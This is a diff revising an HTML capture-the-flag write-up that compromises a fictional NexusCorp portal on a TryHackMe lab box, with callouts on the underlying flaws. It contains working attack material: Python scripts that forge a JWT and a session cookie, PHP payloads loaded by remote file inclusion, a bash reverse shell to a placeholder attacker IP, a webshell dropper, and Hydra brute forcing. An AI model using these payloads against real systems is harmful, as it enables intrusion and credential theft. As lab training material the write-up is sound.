@@ -149,6 +149,7 @@
     <span class="badge badge-d">Medium</span>
   </div>
   <h1><strong>Domino</strong></h1>
+  <p style="font-family: var(--mono); font-size: 13px; color: var(--accent); font-style: italic; margin-bottom: 28px; letter-spacing: 0.02em;">"One tile falls, they all fall."</p>
   <p class="hero-desc">NexusCorp built a portal. NexusCorp also left the AES key in the frontend JS, commented out JWT signature verification, and ran a root cron on a world-writable script. One bad TODO from Laura in October 2024 — full root compromise. Classic.</p>
   <div class="hero-info">
     <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
@@ -185,41 +186,54 @@
       <div class="kc-down">↓</div>
 
       <div class="kc-phase">
-        <div class="kc-phase-label">Phase 2 — Initial Access &amp; Session Hijack</div>
+        <div class="kc-phase-label">Phase 2 — Initial Access as robert.wilson (user)</div>
         <div class="kc-row">
           <span class="kc-node recon">team.php — username enum</span>
           <span class="kc-arr">→</span>
           <span class="kc-node exploit">Hydra → robert.wilson:$PASS</span>
           <span class="kc-arr">→</span>
-          <span class="kc-node creds">Session cookie forge</span>
-          <span class="kc-arr">→</span>
-          <span class="kc-node access">Admin as laura.hayes</span>
+          <span class="kc-node access">user dashboard (no admin)</span>
         </div>
       </div>
 
       <div class="kc-down">↓</div>
 
       <div class="kc-phase">
-        <div class="kc-phase-label">Phase 3 — JWT Forgery &amp; RFI/RCE</div>
+        <div class="kc-phase-label">Phase 3 — JWT Forgery → File API → All Secrets</div>
         <div class="kc-row">
-          <span class="kc-node exploit">JWT — sig check commented out</span>
+          <span class="kc-node exploit">/api/auth/token.php — get JWT</span>
           <span class="kc-arr">→</span>
+          <span class="kc-node exploit">sig check commented out → forge admin JWT</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node creds">read config.php — APP_SECRET</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 4 — Session Forge → Laura Admin</div>
+        <div class="kc-row">
+          <span class="kc-node creds">APP_SECRET extracted</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">forge laura.hayes cookie</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">Welcome Laura — admin panel</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 5 — RFI/RCE &amp; Lateral &amp; Root</div>
+        <div class="kc-row">
           <span class="kc-node exploit">files.php + eval() = RFI</span>
           <span class="kc-arr">→</span>
-          <span class="kc-node access">Webshell → www-data</span>
-        </div>
-      </div>
-
-      <div class="kc-down">↓</div>
-
-      <div class="kc-phase">
-        <div class="kc-phase-label">Phase 4 — Lateral Movement &amp; Root</div>
-        <div class="kc-row">
-          <span class="kc-node creds">$PASS — password reuse</span>
+          <span class="kc-node access">www-data</span>
           <span class="kc-arr">→</span>
-          <span class="kc-node access">SSH as devops</span>
+          <span class="kc-node creds">password reuse → devops</span>
           <span class="kc-arr">→</span>
-          <span class="kc-node exploit">Writable cron script</span>
+          <span class="kc-node exploit">writable cron script</span>
           <span class="kc-arr">→</span>
           <span class="kc-node end">root</span>
         </div>
@@ -251,8 +265,8 @@ sudo nmap -sS -sV -sC 10.49.131.163 -F -T3</code></pre>
 
     <div class="shot">
       <div class="sh"><span class="sl">browser</span><span class="ss">10.49.131.163 — login page</span></div>
-      <img src="domino1.png" alt="NexusCorp Portal login page" loading="lazy" />
-      <div class="sc">NexusCorp Portal. Clean login form. Definitely nothing sensitive in the JS files.</div>
+      <img src="domino1.png" alt="NexusCorp Employee Portal login page" loading="lazy" />
+      <div class="sc">NexusCorp Employee Portal. Clean login form. Definitely nothing sensitive in the JS files.</div>
     </div>
 
     <h3>Directory enumeration</h3>
@@ -307,25 +321,29 @@ print(decrypted.decode(<span class="cs">'utf-8'</span>))</code></pre>
     <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 <span class="cg">{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}</span></code></pre>
 
-    <div class="callout blue"><strong>Intel extracted:</strong> <code>system_user: devops</code> — there is an active OS-level user named <code>devops</code> on this box. Filing that away for Step 6. It will become very relevant.</div>
+    <div class="callout blue"><strong>Intel extracted:</strong> <code>system_user: devops</code> — there is an active OS-level user named <code>devops</code> on this box. Filing that away for Step 7. It will become very relevant.</div>
 
     <div class="callout red"><strong>Why ECB is a bad choice here (and everywhere):</strong> AES-ECB encrypts identical 16-byte blocks identically, leaking block-level patterns. But the real issue is simpler — the key lives in the JS that the browser downloads. It doesn't matter how strong the cipher is if the key is in plaintext next to the ciphertext on a public-facing server.</div>
   </section>
 
-  <!-- 03 HYDRA + SESSION FORGE -->
-  <section class="section" id="sessionforge">
+  <!-- 03 INITIAL ACCESS AS ROBERT -->
+  <section class="section" id="initial">
     <div class="s-num">03</div>
-    <h2>Credential Access &amp; Session Cookie Forge</h2>
+    <h2>Initial Access as robert.wilson (user)</h2>
 
-    <h3>Username enumeration via team.php</h3>
+    <h3>Mapping devops to a real employee</h3>
+
+    <p>Section 02 told us a system user called <code>devops</code> exists on the box. <code>/team.php</code> tells us which employee that is — and it's accessible without authentication:</p>
 
     <div class="shot">
       <div class="sh"><span class="sl">browser</span><span class="ss">/team.php — staff directory</span></div>
-      <img src="domino2.png" alt="NexusCorp team page listing staff members including robert.wilson as DevOps" loading="lazy" />
-      <div class="sc">The team page. robert.wilson is listed as the DevOps engineer. Username confirmed, attack surface identified.</div>
+      <img src="domino2.png" alt="NexusCorp Our Team page listing Laura Hayes (Chief Information Officer), Robert Wilson (DevOps Engineer), and other staff with emails" loading="lazy" />
+      <div class="sc">The team page. Laura Hayes — Chief Information Officer. Robert Wilson — DevOps Engineer. Plus emails in <code>firstname.lastname@nexus.corp</code> format.</div>
     </div>
 
-    <p><code>/team.php</code> is an unauthenticated staff directory. It hands us <code>robert.wilson</code> — the DevOps guy. Now we run Hydra against the login form:</p>
+    <p>Username convention: <code>firstname.lastname</code>. Two high-value targets — <strong>robert.wilson</strong>, the DevOps Engineer (this matches the <code>devops</code> system user from Section 02 — he's the one we want to crack), and <strong>laura.hayes</strong>, Chief Information Officer (almost certainly the admin role on the portal).</p>
+
+    <h3>Hydra against the login form</h3>
 
     <pre><code><div class="ph"><span class="pl">shell — hydra</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 hydra -l robert.wilson -P ~/Downloads/rockyou.txt 10.49.131.163 \
@@ -334,50 +352,26 @@ hydra -l robert.wilson -P ~/Downloads/rockyou.txt 10.49.131.163 \
     <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 <span class="cg">[80][http-post-form] login: robert.wilson   password: $PASS</span></code></pre>
 
-    <p>DevOps. The irony writes itself.</p>
+    <p>The DevOps engineer's password broke off rockyou in seconds. The irony writes itself.</p>
 
-    <h3>Session cookie structure</h3>
+    <h3>Logging in as robert</h3>
 
-    <p>Logging in as robert sets a cookie called <code>nexus_session</code>. Decoding the base64 reveals the structure:</p>
+    <p>Logging in lands us on a <strong>user-role dashboard</strong>. No admin panel, no flag — just whatever the regular employees see. The server sets a session cookie called <code>nexus_session</code>. Decoding it:</p>
 
-    <pre><code><div class="ph"><span class="pl">cookie — decoded</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">nexus_session — decoded</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 nexus_session = base64(<span class="cs">{"user_id":4,"username":"robert.wilson","role":"user"}</span>).hmac_sha256(payload, APP_SECRET)</code></pre>
 
-    <p>Reading <code>auth.php</code> later via the file API reveals the signing secret. With it in hand, we forge an admin cookie for <code>user_id=1</code> — that's laura.hayes, the admin:</p>
-
-    <pre><code><div class="ph"><span class="pl">python3 — forge_cookie.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-import hmac, hashlib, base64, json
-
-secret = <span class="cs">b'$APP_SECRET'</span>
-payload = json.dumps(
-    {<span class="cs">"user_id"</span>: 1, <span class="cs">"username"</span>: <span class="cs">"laura.hayes"</span>, <span class="cs">"role"</span>: <span class="cs">"admin"</span>},
-    separators=(<span class="cs">','</span>, <span class="cs">':'</span>)
-)
-b64 = base64.b64encode(payload.encode()).decode()
-sig = hmac.new(secret, b64.encode(), hashlib.sha256).hexdigest()
-print(f<span class="cs">"{b64}.{sig}"</span>)</code></pre>
-
-    <p>Set the output as <code>nexus_session</code> cookie in the browser. Reload. Instant admin access.</p>
-
-    <div class="shot">
-      <div class="sh"><span class="sl">browser</span><span class="ss">admin panel — welcome laura.hayes</span></div>
-      <img src="domino4.png" alt="NexusCorp admin panel showing Welcome Laura message, confirming admin access via forged session cookie" loading="lazy" />
-      <div class="sc">Welcome back, Laura. We just walked in through the front door using your keys — which were, technically, in the JS file the whole time.</div>
-    </div>
-
-    <div class="callout green"><strong>Flag 2 captured.</strong></div>
-
-    <div class="callout blue"><strong>Why HMAC alone doesn't help when the key is exposed:</strong> HMAC gives you integrity, not secrecy. If the signing secret is readable from the server (here via the file API we're about to exploit), any attacker can mint valid signatures for any payload they want. The secret must be secret — environment variable, secrets manager, not in PHP source files served by a world-readable API.</div>
+    <div class="callout blue"><strong>Where we are:</strong> Authenticated as a <code>user</code>. To reach the admin panel and Flag 2, we need to become <strong>laura.hayes</strong> (role: <code>admin</code>). The session cookie is HMAC-signed with a server-side secret <code>APP_SECRET</code> — without it, we can't forge an admin cookie. That secret lives in <code>auth.php</code> on the server. We need a way to read server-side PHP source. Enter the API.</div>
   </section>
 
   <!-- 04 JWT FORGERY -->
   <section class="section" id="jwt">
     <div class="s-num">04</div>
-    <h2>JWT Forgery → File API Access</h2>
+    <h2>JWT Forgery → File API → All Server Secrets</h2>
 
-    <p>The API at <code>/api/auth/token.php</code> issues JWTs. We request one using robert's session cookie:</p>
+    <p>The <code>/api/</code> directory we found during recon has two endpoints: <code>auth/token.php</code> (issues JWTs) and <code>files.php</code> (reads files, JWT-authenticated, admin-only). Robert can request a JWT — let's see what comes back:</p>
 
-    <pre><code><div class="ph"><span class="pl">shell — get token</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">shell — get JWT as robert</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 curl -s http://10.49.131.163/api/auth/token.php \
   -H <span class="cs">"Cookie: nexus_session=&lt;robert_session&gt;"</span></code></pre>
 
@@ -386,22 +380,18 @@ curl -s http://10.49.131.163/api/auth/token.php \
   <span class="ca">"token"</span>: <span class="cs">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCAiZXhwIjoxNzM0MDAwMDAwfQ.&lt;sig&gt;"</span>
 }</code></pre>
 
-    <p>Decoding the payload section reveals <code>role: user</code>. We try the file API immediately:</p>
+    <p>The JWT payload decodes to <code>{"sub":"robert.wilson","role":"user",...}</code>. Robert is, as expected, role <code>user</code>. The file API requires admin:</p>
 
-    <pre><code><div class="ph"><span class="pl">shell — test file API with user token</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-curl -s http://10.49.131.163/api/files.php?name=../config.php \
-  -H <span class="cs">"Authorization: Bearer &lt;token&gt;"</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">shell — try file API with user JWT</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s <span class="cs">"http://10.49.131.163/api/files.php?name=../auth.php"</span> \
+  -H <span class="cs">"Authorization: Bearer &lt;robert_token&gt;"</span></code></pre>
 
     <pre><code><div class="ph"><span class="pl">response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 <span class="cr">{"error":"Admin role required"}</span></code></pre>
 
-    <p>Role check on the API. We need admin. Time to look at how the token is verified. Via the file API we read <code>auth.php</code> — and inside it there's a comment that is, genuinely, one of the best things I've seen in a CTF:</p>
+    <h3>The signature check that wasn't</h3>
 
-    <pre><code><div class="ph"><span class="pl">auth.php — vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-<span class="ck">// Signature check intentionally disabled</span>
-<span class="ck">// if (!hash_equals($parts[2], $expected)) return null;</span></code></pre>
-
-    <p>JWT signature verification is <strong>commented out</strong>. The server accepts any token where the header and payload are valid base64 — it doesn't check whether the signature is real. We forge a token with <code>role: admin</code>:</p>
+    <p>We forge a token with <code>role: admin</code>. For the signing secret we use <code>N3xusK3y2024!!</code> — the AES key we already extracted from <code>app.js</code> in Section 02. Why this one? Because we have it. Whether or not it matches the server's actual JWT secret is something we'll find out shortly:</p>
 
     <pre><code><div class="ph"><span class="pl">python3 — forge_jwt.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 import hmac, hashlib, base64, json, time
@@ -411,7 +401,7 @@ def b64url(data):
         data = data.encode()
     return base64.urlsafe_b64encode(data).rstrip(b<span class="cs">'='</span>).decode()
 
-secret = <span class="cs">b'$JWT_SECRET'</span>
+secret = <span class="cs">b'N3xusK3y2024!!'</span>  <span class="ck"># the AES key from app.js — using what we have</span>
 
 header  = b64url(json.dumps({<span class="cs">"alg"</span>: <span class="cs">"HS256"</span>, <span class="cs">"typ"</span>: <span class="cs">"JWT"</span>}, separators=(<span class="cs">','</span>, <span class="cs">':'</span>)))
 payload = b64url(json.dumps({
@@ -425,23 +415,83 @@ msg = f<span class="cs">"{header}.{payload}"</span>
 sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
 print(f<span class="cs">"{msg}.{b64url(sig)}"</span>)</code></pre>
 
-    <p>With the admin JWT, <code>/api/files.php?name=</code> becomes our filesystem browser. First thing we read: <code>config.php</code>.</p>
+    <p>Send the forged admin JWT to the file API, asking for <code>config.php</code>:</p>
 
-    <pre><code><div class="ph"><span class="pl">config.php — extracted</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-DB_USER:    <span class="cg">app_user</span>
-DB_PASS:    <span class="cy">$PASS</span>
-JWT_SECRET: <span class="cg">$JWT_SECRET</span>
-APP_SECRET: <span class="cg">$APP_SECRET</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">shell — read config.php with forged admin JWT</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s <span class="cs">"http://10.49.131.163/api/files.php?name=/var/www/html/config.php"</span> \
+  -H <span class="cs">"Authorization: Bearer $TOKEN"</span></code></pre>
 
-    <div class="callout red"><strong>Two bugs, one catastrophe:</strong> The file API has no path restriction — any filename is valid. Combined with the disabled JWT signature check, any attacker with a browser and a Python script can read arbitrary files from the server's filesystem. This is the architectural equivalent of leaving every door unlocked and also removing the doors.</div>
+    <pre><code><div class="ph"><span class="pl">response — JSON-wrapped PHP source</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{
+  <span class="ca">"file"</span>: <span class="cs">"/var/www/html/config.php"</span>,
+  <span class="ca">"content"</span>: <span class="cs">"&lt;?php
+define('DB_HOST', 'localhost');
+define('DB_NAME', 'nexusdb');
+define('DB_USER', 'app_user');
+define('DB_PASS', '$PASS');
+define('JWT_SECRET', '$JWT_SECRET');
+define('APP_SECRET', '$APP_SECRET');
+
+function get_db() {
+    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
+    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    ...
+}"</span>
+}</code></pre>
+
+    <p>It works — but here's the punchline: the <code>JWT_SECRET</code> defined in <code>config.php</code> is <strong>not</strong> the AES key we just signed with. Two completely different values. The only way our forged token was accepted is if the server isn't actually verifying the signature at all. A quick look at <code>auth.php</code> (via the same file API) confirms it:</p>
+
+    <pre><code><div class="ph"><span class="pl">auth.php — the vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck">// Signature check intentionally disabled</span>
+<span class="ck">// if (!hash_equals($parts[2], $expected)) return null;</span></code></pre>
+
+    <p>Commented. Out. Any string in the signature slot would have passed. The server decodes the base64 header and payload, reads <code>role: admin</code>, and asks no further questions.</p>
+
+    <div class="callout green"><strong>What we just gained:</strong> the DB password (we'll need this for Section 07 lateral movement), the real <code>JWT_SECRET</code> (purely academic — sig isn't checked), and crucially <code>APP_SECRET</code> — the missing piece for forging Laura's session cookie. Next section.</div>
+
+    <div class="callout red"><strong>Two bugs, one catastrophe:</strong> The file API has no path restriction — any filename is valid. Combined with the disabled JWT signature check, any logged-in user can mint admin tokens and read the entire server filesystem. The architectural equivalent of installing locks and then removing the bolts.</div>
   </section>
 
-  <!-- 05 RFI / RCE -->
-  <section class="section" id="rce">
+  <!-- 05 SESSION FORGE -->
+  <section class="section" id="sessionforge">
     <div class="s-num">05</div>
+    <h2>Session Cookie Forge → Laura Admin</h2>
+
+    <p>We've got <code>APP_SECRET</code> from <code>config.php</code>. Now we can mint a valid <code>nexus_session</code> cookie for <strong>laura.hayes</strong> (<code>user_id=1</code>, <code>role=admin</code>):</p>
+
+    <pre><code><div class="ph"><span class="pl">python3 — forge_cookie.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+import hmac, hashlib, base64, json
+
+secret = <span class="cs">b'$APP_SECRET'</span>  <span class="ck"># extracted in Section 04</span>
+payload = json.dumps(
+    {<span class="cs">"user_id"</span>: 1, <span class="cs">"username"</span>: <span class="cs">"laura.hayes"</span>, <span class="cs">"role"</span>: <span class="cs">"admin"</span>},
+    separators=(<span class="cs">','</span>, <span class="cs">':'</span>)
+)
+b64 = base64.b64encode(payload.encode()).decode()
+sig = hmac.new(secret, b64.encode(), hashlib.sha256).hexdigest()
+print(f<span class="cs">"{b64}.{sig}"</span>)</code></pre>
+
+    <p>Open browser DevTools, replace the <code>nexus_session</code> cookie value with the forged token, refresh the page:</p>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">/dashboard.php — Welcome, laura.hayes</span></div>
+      <img src="domino4.png" alt="NexusCorp dashboard showing Welcome laura.hayes with Role: admin, plus File Viewer card describing /api/files.php?name= endpoint and JWT authentication via /api/auth/token.php" loading="lazy" />
+      <div class="sc">Welcome back, Laura. Role: admin. The forged session cookie is accepted as a valid admin session — the server has no way to tell the difference.</div>
+    </div>
+
+    <p>Laura's dashboard also helpfully advertises the very endpoints we just exploited in Section 04 — the <code>/api/files.php?name=</code> file viewer and the <code>/api/auth/token.php</code> JWT issuer. The admins were always meant to use these tools; the vulnerability is that the access controls don't actually work.</p>
+
+    <div class="callout green"><strong>Flag 2 captured</strong> — admin panel access via session hijack.</div>
+
+    <div class="callout blue"><strong>Why HMAC alone doesn't save you when the key leaks:</strong> HMAC gives you integrity, not secrecy. If an attacker can read the signing key from the server (here, via the file API), they can mint valid signatures for any payload they want. Session secrets must live in env vars or a secrets manager — never in PHP source files that anything on the server can read.</div>
+  </section>
+
+  <!-- 06 RFI / RCE -->
+  <section class="section" id="rce">
+    <div class="s-num">06</div>
     <h2>RFI → RCE → Flags 1 &amp; 3</h2>
 
-    <p><code>files.php</code> has one more trick. If the <code>name</code> parameter starts with <code>http://</code>, it fetches the URL and passes it straight to <code>eval()</code>:</p>
+    <p><code>files.php</code> has one more trick beyond local file reads. If the <code>name</code> parameter starts with <code>http://</code>, it fetches the URL and passes the content straight to <code>eval()</code>:</p>
 
     <pre><code><div class="ph"><span class="pl">files.php — vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 if (strpos($name, <span class="cs">"http://"</span>) === 0) {
@@ -449,22 +499,24 @@ if (strpos($name, <span class="cs">"http://"</span>) === 0) {
     eval(str_replace(<span class="cs">"&lt;?php"</span>, <span class="cs">""</span>, $remote));
 }</code></pre>
 
-    <p>We host a PHP file on our attack machine and point the API at it. The server fetches it, strips the opening <code>&lt;?php</code> tag, and executes it as PHP. Remote File Inclusion in 2024. Beautiful.</p>
+    <p>We host a PHP file on our attack machine and point the API at it. The server fetches it, strips the opening <code>&lt;?php</code> tag, and executes it. Remote File Inclusion in 2024. Beautiful.</p>
 
-    <h3>Start a listener and serve the payload</h3>
+    <h3>Serve the payload</h3>
 
     <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-python3 -m http.server 8000</code></pre>
+python3 -m http.server 8888</code></pre>
 
     <h3>Read Flag 3</h3>
     <pre><code><div class="ph"><span class="pl">flag3.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 &lt;?php echo shell_exec(<span class="cs">'cat /opt/flag3.txt'</span>); ?&gt;</code></pre>
 
     <pre><code><div class="ph"><span class="pl">shell — trigger RFI</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-curl -H <span class="cs">"Authorization: Bearer &lt;JWT&gt;"</span> \
-  <span class="cs">"http://10.49.131.163/api/files.php?name=http://&lt;ATTACKER_IP&gt;:8000/flag3.php"</span></code></pre>
+curl -s <span class="cs">"http://10.49.131.163/api/files.php?name=http://&lt;ATTACKER_IP&gt;:8888/flag3.php"</span> \
+  -H <span class="cs">"Authorization: Bearer $TOKEN"</span></code></pre>
 
     <h3>Dump the database for Flag 1</h3>
+
+    <p>The admin dashboard doesn't show Flag 1 anywhere — it's hiding in the <code>notes</code> column of the <code>users</code> table. Same RFI vector, different payload: a PHP file that opens a PDO connection with the DB credentials we extracted in Section 04 and dumps the users table.</p>
 
     <pre><code><div class="ph"><span class="pl">query.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 &lt;?php
@@ -475,42 +527,62 @@ foreach ($stmt-&gt;fetchAll(PDO::FETCH_ASSOC) as $row) {
 }
 ?&gt;</code></pre>
 
-    <pre><code><div class="ph"><span class="pl">output — db dump</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-<span class="cg">laura.hayes  | admin | THM{...}</span>
-robert.wilson | user  |</code></pre>
+    <pre><code><div class="ph"><span class="pl">shell — trigger RFI (db dump)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s <span class="cs">"http://10.49.131.163/api/files.php?name=http://&lt;ATTACKER_IP&gt;:8888/query.php"</span> \
+  -H <span class="cs">"Authorization: Bearer $TOKEN"</span></code></pre>
 
-    <h3>Drop a persistent webshell</h3>
+    <pre><code><div class="ph"><span class="pl">response — JSON-wrapped output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{
+  <span class="ca">"output"</span>: <span class="cs">"<span class="cg">laura.hayes  | admin | THM{...}</span>
+michael.chen   | user  |
+sarah.johnson  | user  |
+robert.wilson  | user  |
+emma.taylor    | user  | Q3 migration notes: infra review pending approval
+david.brown    | user  |
+james.wright   | user  | "</span>
+}</code></pre>
+
+    <p>Flag 1 sits in laura.hayes' notes column. Everyone else's notes are empty, except emma.taylor's Q3 migration mention (no flag, just an organizational footnote).</p>
+
+    <h3>Reverse shell — www-data on the box</h3>
+
+    <p>Same RFI vector, simpler payload. <code>shell.php</code> just calls <code>system()</code> with a bash reverse shell one-liner:</p>
 
     <pre><code><div class="ph"><span class="pl">shell.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-&lt;?php file_put_contents(<span class="cs">'/var/www/html/shell.php'</span>, <span class="cs">'&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;'</span>); ?&gt;</code></pre>
+&lt;?php system(<span class="cs">'bash -c "bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1"'</span>); ?&gt;</code></pre>
 
-    <p>Now we have a stable webshell at <code>/shell.php?cmd=</code>. Upgrade to a proper reverse shell:</p>
-
-    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-<span class="ck"># listener</span>
+    <pre><code><div class="ph"><span class="pl">shell — listener + trigger</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># attack machine — listener</span>
 nc -lvnp 4444
 
-<span class="ck"># trigger reverse shell</span>
-curl <span class="cs">"http://10.49.131.163/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/&lt;ATTACKER_IP&gt;/4444+0>%261'"</span></code></pre>
+<span class="ck"># trigger RFI — server fetches and executes shell.php</span>
+curl -s <span class="cs">"http://10.49.131.163/api/files.php?name=http://&lt;ATTACKER_IP&gt;:8888/shell.php"</span> \
+  -H <span class="cs">"Authorization: Bearer $TOKEN"</span></code></pre>
 
-    <p>We are <code>www-data</code>. Not root yet, but we're on the box.</p>
+    <pre><code><div class="ph"><span class="pl">listener — shell drops</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">www-data@tryhackme-2404:/$ id</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 
-    <div class="callout green"><strong>Flag 1 captured</strong> (from DB via RFI) &nbsp;·&nbsp; <strong>Flag 3 captured</strong> (read via RCE)</div>
+    <p>We're <code>www-data</code>. Not root yet, but we're on the box.</p>
+
+    <div class="callout green"><strong>Flag 1 captured</strong> (DB dump via RFI) &nbsp;·&nbsp; <strong>Flag 3 captured</strong> (read via RCE)</div>
   </section>
 
-  <!-- 06 LATERAL MOVEMENT -->
+  <!-- 07 LATERAL MOVEMENT -->
   <section class="section" id="lateral">
-    <div class="s-num">06</div>
+    <div class="s-num">07</div>
     <h2>Password Reuse → devops</h2>
 
-    <p>First thing — drop <code>pspy64</code> on the target. It shows all running processes in real time without root privileges:</p>
+    <h3>pspy64 — what is root actually doing?</h3>
 
-    <pre><code><div class="ph"><span class="pl">shell — upload pspy64 to target</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <p>First thing as www-data — drop <code>pspy64</code> on the target to see what root processes are firing. It snoops <code>/proc</code> and reports running PIDs without needing root itself:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — upload pspy64</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 <span class="ck"># attack machine — serve the binary</span>
-python3 -m http.server 8000
+python3 -m http.server 8888
 
-<span class="ck"># on the target (www-data shell)</span>
-wget http://&lt;ATTACKER_IP&gt;:8000/pspy64 -O /tmp/pspy64
+<span class="ck"># www-data shell on target</span>
+wget http://&lt;ATTACKER_IP&gt;:8888/pspy64 -O /tmp/pspy64
 chmod +x /tmp/pspy64
 /tmp/pspy64</code></pre>
 
@@ -520,18 +592,50 @@ chmod +x /tmp/pspy64
 2024/10/22 14:01:01 CMD: <span class="cy">UID=0</span>   PID=1337 | <span class="cg">/bin/bash /opt/monitoring/health_report.sh</span>
 2024/10/22 14:02:01 CMD: <span class="cy">UID=0</span>   PID=1351 | <span class="cg">/bin/bash /opt/monitoring/health_report.sh</span></code></pre>
 
-    <p>UID=0, every minute, on the dot. That script is going on our list. We'll come back to it.</p>
+    <p>UID=0, every minute, on the dot. That script is going on our list — we'll come back to it in Section 08.</p>
 
-    <p>But first, a simpler path. <code>/opt/admin_bot.py</code> is world-readable and has permissions <code>rwxrwxrwx</code>. Inside it, the DB password is hardcoded. Remember the <code>system_user</code> from the encrypted config back in Step 2? <code>devops</code>.</p>
+    <h3>Exploring /opt — admin_bot.py</h3>
 
-    <pre><code><div class="ph"><span class="pl">shell — on the target</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">www-data shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /opt</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+drwxrwxrwx  5 root     root     4096 May  7 20:26 .
+drwxr-xr-x 22 root     root     4096 May 29 22:14 ..
+drwxrwxr-x  2 ubuntu   ubuntu   4096 Apr 29 16:24 __pycache__
